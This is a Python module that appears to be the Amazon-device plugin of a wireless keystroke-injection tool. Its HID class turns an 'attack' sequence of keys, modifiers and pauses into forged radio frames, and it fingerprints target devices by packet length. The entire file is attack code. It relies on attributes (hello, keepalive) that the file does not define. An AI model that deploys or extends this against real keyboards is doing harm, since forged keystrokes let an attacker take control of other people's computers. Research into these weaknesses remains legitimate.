# -*- coding: utf-8 -*-


class HID(object):
    ''' Injection for Amazon devices '''

    def __init__(self, address, payload):
        self.address = address
        self.device_vendor = 'Amazon'
        self.payload_template = [0x0f] * 24

    def key(self, payload, key):
        payload[19:24] = [0, 0, 0, 0, 0]
        payload[20] = key['mod']
        payload[22] = key['hid']
        return payload

    def frame(self, key={'hid': 0, 'mod': 0}):
        return self.key(self.payload_template[:], key)

    def build_frames(self, attack):
        for i in range(0, len(attack)):
            key = attack[i]

            if i == 0:
                key['frames'] = [[self.hello[:], 12]]
            else:
                key['frames'] = []

            if i < len(attack) - 1:
                next_key = attack[i + 1]
            else:
                next_key = None
            next_key_mod = 0
            if key['hid'] or key['mod']:
                key['frames'].append([self.frame(key), 12])
                key['frames'].append([self.keepalive[:], 0])
                if next_key and key['mod'] == next_key['mod']:
                    next_key_mod = key['mod']
                    
                if not next_key:
                    key['frames'].append([self.frame(), 0])

                elif key['hid'] == next_key['hid']:
                    dummykey = {'hid':0, 'mod': next_key_mod}
                    key['frames'].append([self.frame(dummykey), 0])

                elif next_key['sleep']:
                    key['frames'].append([self.frame(), 0])

            elif key['sleep']:
                count = int(key['sleep']) / 10
                for i in range(0, int(count)):
                    key['frames'].append([self.keepalive[:], 10])

    @classmethod
    def fingerprint(cls, p):
        if len(p) == 6:
            return cls
        return None

    @classmethod
    def description(cls):
        return 'Amazon HID'
